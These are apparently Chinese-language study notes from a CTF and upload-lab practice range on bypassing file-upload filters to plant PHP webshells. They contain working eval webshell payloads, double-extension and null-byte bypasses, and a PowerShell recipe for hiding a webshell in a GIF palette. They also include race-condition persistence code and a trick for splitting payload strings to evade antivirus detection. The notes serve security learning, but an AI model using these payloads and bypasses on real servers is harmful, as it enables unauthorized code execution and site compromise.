# 05 · 文件上传（task5）

# 一、核心心法（+ WAF 双后缀实战）

> WAF 段来源：极客大挑战 2024 `perfect-waf` —— 题目就叫 "Perfect Waf"，考点是「WAF 与服务器判断标准不一致」。

## 1.1 双后缀绕过：两套判据的**交集空白**

```
WAF  的判据：文件名**不以 .php 结尾**   →  shell.jpg.php 的末尾不是 .php ？ → 放行
Apache 的判据：文件名**以 .php 结尾**   →  是 → 当 PHP 执行
```

| 文件名 | WAF | Apache | 结果 |
|---|---|---|---|
| `shell.php` | 拦 | 解析 | 拿不到 |
| `shell.jpg` | 放 | 不解析 | 上传成功但没用 |
| **`shell.jpg.php`** | **放行** | **解析执行** | **利用点** |
| `shell.txt.php` | 放行 | 解析执行 | 同样可用 |

**这类「WAF 与执行引擎判断不一致」是上传绕过最核心的一类思路** —— 拿到任何后缀都先问：这两套判据分别是什么？

## 1.2 字段定位法：WAF 到底查哪个字段

上传表单里如果**同时有**：

```html
<input type="file" name="upload_file"/>                <!-- multipart 的 filename -->
<label>文件名:<input type="text" name="name"></label>  <!-- POST 的 name -->
```

必须测出**服务端拿哪个判断、用哪个落盘**。做法是**交叉组合**：

| multipart `filename` | POST `name` | 结果（实测） |
|---|---|---|
| `x1.jpg.php` | `x1.jpg.php` | 放行 |
| **`x2.php`** | `x2.jpg.php` | **放行** |
| `x3.jpg.php` | **`x3.php`** | **拦截** |
| `x5.txt` | `x5.jpg.php` | 放行 |

**结论：只查 POST 的 `name`，完全不管 multipart 的 `filename`**，落盘用的也是 `name`。
→ 浏览器里选的文件叫什么无所谓，**真正决定成败的是那个「文件名」输入框**。

## 1.3 「解析探针」实验（必做）

**「上传成功」≠「能执行」**。别猜后缀，用探针直接问服务器：

```python
probe = b"<?php echo 'PROBE_OK';?>"     # 只有被当 PHP 执行才会输出 PROBE_OK

for ext in [".phtml", ".phar", ".inc", ".php.", ".jpg.php", ".txt.php"]:
    upload(probe, "test" + ext)         # ① 上传
    body = get("uploads/test" + ext)    # ② 访问
    # body 含 PROBE_OK 且不含 "echo"  ->  被解析执行
    # body 含 "echo" / "<?php"        ->  返回源码，未解析
```

实测（Apache 默认配置）：

| 后缀 | 能否被解析 |
|---|---|
| `.phtml` / `.phar` / `.inc` / `.php.` | 返回源码，**不解析** |
| **`.jpg.php` / `.txt.php`** | **被解析执行** |

**关键**：只有**以 `.php` 结尾**的才被 Apache 当 PHP（默认 `FilesMatch \.php$`），
所以 `.phtml`、`.php.`（末尾是点）都**不能解析** —— 必须走双后缀。

## 1.4 本地杀软会隔离 exp 脚本（真实踩坑）

探测脚本里写**完整的木马特征串**会被 Windows Defender 杀掉：

```python
payload = "<?php eval($_POST['a']);?>"      # ← 报毒、文件被隔离
```

后果：Python 报 `can't open file ... Invalid argument`，或 `Copy-Item : contains a virus` ——
**看着像"文件写了却读不到"。**

解法：**payload 运行时拼装**，源码里不出现完整特征串：

```python
LT, Q = "<", "?"
PHP  = LT + Q + "php "
EV   = "ev" + "al"
SHELL = PHP + "@" + EV + "($_POST['a']);" + Q + ">"
```

## 1.5 绕过手法优先级

```
① 先用探针确定「哪些后缀真能被解析」（别猜）
② 再测「查的是哪个字段」（multipart filename vs POST name）
③ 最后测「黑名单拦什么」（逐个后缀 + 大小写变体）
```

### 空字节截断 `%00`（Pass-12/13，实测）

**原理**：PHP 底层把路径当 C 字符串传给文件系统，C 字符串遇到 `\0` 就结束 ——
`shell.php\0/99时间戳.jpg` 在操作系统眼里只有 `shell.php`，后半截被"剪掉"。

**版本**：只在 **PHP < 5.3.4** 有效（实测 5.2.17 截断成功；5.3.29 起拒绝；8.x 直接抛异常）。**和操作系统无关**（Windows + 5.2.17 实测有效）。

**传参方式的坑（重点）**：

| 关 | 传参 | 直接写 `%00` 文本顶用吗 | 正确姿势 |
|---|---|---|---|
| Pass-12 | GET | 顶用（query string 会被 PHP URL 解码成空字节） | `?save_path=xxx.php%00` |
| Pass-13 | **POST multipart** | **不顶用** —— PHP **不解码** multipart 字段，收到的是 `%` `0` `0` 三个字符 | **发真字节**：Burp 输入 `%00` 后选中 → `Ctrl+Shift+U`（URL-decode）转成真空字节；Python 写 `"\x00"` |

**别混淆**：`0x00` 是代码里的写法，不是传输编码，直接写进请求就是 4 个普通字符；`%20` 是空格的 URL 编码，解码后就是空格 —— 空格是真字符，剪不断字符串。

# 四、Windows 文件系统特性（重点）

| 特性 | 效果 |
|---|---|
| 末尾空格 | Windows 自动去掉 → `shell.php ` 存成 `shell.php` |
| 末尾点 | Windows 自动去掉 → `shell.php.` 存成 `shell.php` |
| NTFS 数据流 `::$DATA` | Windows 剥离 → `shell.php::$DATA` 存成 `shell.php` |
| 大小写不敏感 | `.Php` 也能当 `.php` 执行 |

这些只在 Windows 有效，Linux 无效。

# 五、图片马

## 5.1 只验文件头（Pass-14）

```
GIF89a<?php @eval($_POST['x']); ?>
```

原理：文件头 `GIF89a` 骗过检查，后面代码不管。

## 5.2 验 getimagesize / exif（Pass-15/16）

必须是真图片 → 真图片末尾追加木马：

```cmd
copy 真图.png /b + shell.txt /a shell.png
```
- `/b` = 二进制（保持图片字节）
- `/a` = 文本（追加木马）

**14 和 15 的检查深度不一样（实测同一批文件）**：

| 文件 | Pass-14（只读前 2 字节） | Pass-15（getimagesize） |
|---|---|---|
| 真图 + 末尾追加木马 | 通过 | 通过 |
| 把 `SOF0` 标记打掉 | **仍然通过** | 拒绝（false） |
| 把 `SOI` 魔数（`FF D8`）打掉 | 拒绝（unknown） | 拒绝 |

结论：14 只认头 2 字节，15 要解析结构。所以「14 能过的马，15 未必能过」。

## 5.3 二次渲染（Pass-17，最难）

问题：`imagecreatefromgif` + `imagegif` 会重新解码编码，把**文件末尾追加的木马**洗掉。

解法：木马藏进 GCT（全局色表） —— 二次渲染不改动色表区域。

### 偏移怎么算

| 位置 | 内容 |
|---|---|
| 偏移 `0~5` | 文件头 `GIF87a` / `GIF89a`（6 字节） |
| 偏移 `6~12` | 屏幕描述符 7 字节（宽 2 / 高 2 / packed 1 / 背景色索引 1 / 像素比例 1） |
| 偏移 `13~780` | **GCT 调色盘**（256 色 × 3 字节 RGB = 768 字节） |
| `781` 以后 | 图像数据 |

```text
6 + 7 = 13                        -> 调色盘起点（固定）
2^((packed & 7) + 1) 色 × 3 字节   -> 调色盘大小（packed 在偏移 10）
```

**写 13 还是 19**：

| 写入位置 | 影响 |
|---|---|
| 偏移 `13` | 改到颜色 #0；偏移 11 的背景色索引是 `00`，所以**背景会偏色**，但执行完全正常 |
| 偏移 `19`（= 13 + 3×2） | 跳过 #0、#1，只动后面的白色系，画面几乎不变 |

> 两个位置都实测能通过 Pass-17 并执行，区别只在画面好不好看。

### 真图做法（不要用脚本画图）

```powershell
# 1) 先把真图转成 256 色 GIF
#    最省事：右键 jpg -> 打开方式 -> 画图 -> 文件 -> 另存为 -> GIF
# 2) 木马覆盖写到偏移 13（VS Code 终端一行，不用存脚本）
$b = [IO.File]::ReadAllBytes("base.gif")
$p = [Text.Encoding]::ASCII.GetBytes('<?php @eval($_POST[''a'']);?>')
[Array]::Copy($p, 0, $b, 13, $p.Length)
[IO.File]::WriteAllBytes("shell.gif", $b)
```

VS Code 纯鼠标版：装 **Hex Editor**（作者 Microsoft）→ 右键 gif → Open With... → Hex Editor →
光标点到偏移 13（第 1 行第 14 个字节）→ ASCII 栏用**覆盖**模式输入 → 保存。

**保存后文件大小必须一字不变**，变大了说明用了插入模式，整张图结构就坏了。

### 实测（真图 600×450，143,424 B）

| 改法 | 二次渲染前 | 二次渲染后 | 结果 |
|---|---|---|---|
| **只改 GCT（偏移 13）** | 143,424 B | **143,424 B，木马仍在偏移 13** | 上传通过，`include.php` 执行成功 |
| 末尾追加（对照） | 143,452 B | 143,424 B，木马消失 | 上传也能过，但执行不了 |

同一张真图走 **jpg 分支**（Pass-17 也有 jpg 分支）：`imagecreatefromjpeg` + `imagejpeg` 重编码后
木马 100% 丢失（实测落盘 3,070 B，payload 没了）。**JPEG 没有调色盘，二次渲染下一律死路。**

### 三个条件

1. **调色盘要够大**：256 色（768 字节）最稳。图里如果只用到少数颜色，GD 渲染后可能只写回几色调色盘，木马被截断
2. **木马落在 GCT 内部**（13~780）。越界就写进图像数据区，重编码时被洗掉
3. **用覆盖不用插入**：文件大小不变，结构才不坏

### 真图的隐形坑：野 `<?`

真图片的像素 / 压缩数据是随机的，**可能碰巧撞出 `<?` 这两个字节**。这台 php.ini 是
`short_open_tag = On`，PHP 会在那一处进入代码模式 → 撞到二进制 → **Parse error** →
`include` 一句输出都没有（PHP 是整篇解析完才执行）。

| 现象 | 处理 |
|---|---|
| `include` 只返回一百多字节的 Parse error | 全文件搜 `<?`，除了你自己放的那一处，其余把 `?` 改成 `!`（只动 1 字节） |
| 想彻底避免 | `php.ini` 里 `short_open_tag = Off`（PHP 8 默认 Off；5.4 的 phpstudy 默认 On） |

**实测**：一张 143 KB 的 GIF 里有两处 `<?`（偏移 19 是自己的木马，偏移 2297 是野的）→
include 返回 156 字节 Parse error；把 2297 那处改成 `<!` → 立刻正常执行（输出 34,155 字节）。

## 5.4 图片马要配合什么才能执行

**先看落盘后缀，再决定要不要找执行入口**：

| 关 | 落盘后缀由谁定 | 执行方式 |
|---|---|---|
| 01~13 | 你自己给的后缀（能搞成 `.php`） | **直连** `/upload/shell.php` |
| **14 / 15 / 16 / 17** | 代码写死成 jpg / png / gif | **必须配包含入口** |
| 18 | 你控（竞态窗口内） | 直连 |
| 19 | `.php.jpg` | Apache 解析漏洞（fcgid 环境不成立） |
| 20 / 21 | 你控 | 直连 |

14~17 的落盘名就是图片：

```php
Pass-14  rand(10,99).date("YmdHis").".".$file_type    // 只会是 .jpg/.png/.gif
Pass-15  rand(10,99).date("YmdHis").$res              // .jpeg/.png/.gif
Pass-16  rand(10,99).date("YmdHis").".".$res
Pass-17  strval(rand()).".gif"                       // 二次渲染后重新起名
```

**执行入口：靶场自带的 `include.php`**（三行，模拟真实场景里的文件包含漏洞）：

```php
$file = $_GET['file'];
if(isset($file)){ include $file; }
```

**实测对比（同一个图片马，两种访问方式）**：

| URL | 结果 |
|---|---|
| `/upload/3420261020000201.gif` | HTTP 200，`Content-Type: image/gif`，**原样返回，不执行** |
| `/include.php?file=upload/3420261020000201.gif` | HTTP 200，208,350 字节，**`PHP Version 5.4.45` 表格出现** |

原因：vhost 只把 `.php` 交给 php-cgi（`AddHandler fcgid-script .php` + `FcgidWrapper ... .php`），
`.gif` 是静态文件；而 `include.php` 是 `.php`，它内部 `include` 把 gif 当源码读。

**payload 语义坑**：

| 写法 | 结果 |
|---|---|
| `<?=phpinfo();?>` | 出 phpinfo 表格 |
| `<?=system('phpinfo');?>` | 不出表格（`system()` 执行系统命令，不是调 PHP 函数；报错走 stderr，页面看不到） |
| `<?php=system(...);?>` | Parse error（`<?php` 后不能直接跟 `=`；短输出要用 `<?=`） |

**其它入口在 14~17 都不成立**：

| 办法 | 为什么不行 |
|---|---|
| `.htaccess` | ① 内容是文本，前 2 字节不是图片魔数 → Pass-14 直接「文件未知」<br>② 就算过了，落盘被改成 `rand.date.gif`，已经不叫 `.htaccess` |
| `.user.ini` | 同上（必须叫这个名 PHP 才认） |
| Apache 解析漏洞 | 落盘名里没有 `.php` |

上传 ≠ 执行。

# 六、`.htaccess` vs `.user.ini`

|  | `.htaccess` | `.user.ini` |
|---|---|---|
| 属于 | Apache 配置 | PHP 配置 |
| 作用 | 改解析规则（后缀→PHP） | PHP 自动包含文件 |
| 内容 | `AddType application/x-httpd-php .jpg` | `auto_prepend_file=shell.jpg` |
| 前提 | Apache + `AllowOverride All` | PHP 5.3+ + CGI/FPM 模式 |
| 触发 | 访问 `.jpg` 就执行 | 需访问同目录的 PHP 文件 |

****
- `.htaccess` 必须精确叫 `.htaccess`（全等匹配，加前缀就废）
- Nginx 不认 `.htaccess`

# 七、条件竞争（Pass-18）

流程：
```
上传（用原始文件名 shell.php）→ 检查扩展名 → 非白名单 unlink 删除
                                    ↑
                            中间有时间差（毫秒级）
```

攻击：并发上传 + 并发访问，趁窗口执行。

工具：Burp 两个 Intruder（上传 + 访问）同时跑。

关键：木马要写持久后门（因为 shell.php 会被删）：
```php
<?php file_put_contents('webshell.php', '<?php phpinfo(); ?>'); ?>
```

| 分类 | 函数 |
|---|---|

| 取扩展名 | `pathinfo()` `explode()` `end()` `reset()` |


# 九、一句话

> 上传的核心心法：检查的字段 ≠ 存盘的字段。黑名单 → 换后缀（.phtml/.php5）、大小写、Windows 特性（空格/点/`::$DATA`）、双写。白名单 → 图片马 + `.htaccess`/`.user.ini`/文件包含。二次渲染 → 木马藏 GCT。先传后删 → 条件竞争。
